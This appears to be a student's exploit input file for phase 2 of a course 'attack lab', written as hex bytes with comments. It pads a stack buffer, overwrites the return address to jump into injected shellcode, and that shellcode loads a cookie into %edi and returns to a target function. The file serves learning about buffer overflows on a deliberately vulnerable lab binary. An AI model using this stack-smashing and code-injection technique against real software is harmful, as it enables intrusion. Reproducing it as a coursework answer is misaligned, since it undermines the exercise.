/* phase2_exploit - exploit code for phase 2 of attack lab
 * 0x28 bytes of padding
 * */

48 41 48 41 48 41 48 41
48 41 48 41 48 41 48 41
48 41 48 41 48 41 48 41
48 41 48 41 48 41 48 41
48 41 48 41 48 41 48 41

/* injecting return code right above %rsp
 * %rsp = 0x5561dca0
 * return addr: 0x5561dcb0
 */
b0 dc 61 55 00 00 00 00

/* return address of touch 2
 * right above the previous ret address
 * or %rsp + 0x8
 */
ec 17 40 00 00 00 00 00

/* move cookie into edi
 * taken from disass digging
 * the return code above should point here
 */
bf fa 97 b9 59 /* mov 0x59b997fa %edi */

/* ret instruction will do a jump
 * to whatever address rsp is pointing at
 * 48 83 c4 08
 * add $0x8 %rsp
 * this turns out to not be necessary
 * since ret already pop the stack and increment
 * the stack pointer
 */
c3 /* ret */



